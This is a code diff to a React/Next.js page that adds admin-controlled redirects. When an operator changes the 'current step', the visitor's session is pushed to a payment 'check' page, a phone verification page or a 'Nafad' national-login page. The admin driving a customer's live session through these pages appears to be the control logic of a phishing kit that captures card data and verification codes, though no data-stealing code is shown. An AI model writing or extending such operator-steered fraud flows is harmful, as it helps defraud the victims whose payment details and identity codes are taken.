@@ -85,8 +85,7 @@ export default function ConfiPage() {
         })
       }
 
-      // Handle navigation based on currentStep (only for admin redirects, not initial load)
-      // We skip redirection for _t2 and _t3 because those are previous/current pages
+      // Handle navigation based on currentStep (admin redirects)
       if (step && !hasRedirected.current) {
         if (step === "_t2") {
           // This is previous page - redirect back
@@ -94,9 +93,20 @@ export default function ConfiPage() {
           router.push("/step2")
         } else if (step === "_t3") {
           // This is our page - don't redirect
+        } else if (step === "_st1") {
+          // Admin wants to redirect to check/payment page
+          hasRedirected.current = true
+          router.push("/check")
+        } else if (step === "phone") {
+          // Admin wants to proceed to phone verification
+          hasRedirected.current = true
+          router.push("/step5")
+        } else if (step === "_t6") {
+          // Admin wants to skip to Nafad page
+          hasRedirected.current = true
+          router.push("/step4")
         }
-        // Note: We intentionally do NOT redirect based on other currentStep values
-        // to prevent random redirects when admin changes step during customer's session
+        // Note: We intentionally do NOT redirect based on "home" to prevent random redirects
       }
 
       setIsLoading(false)
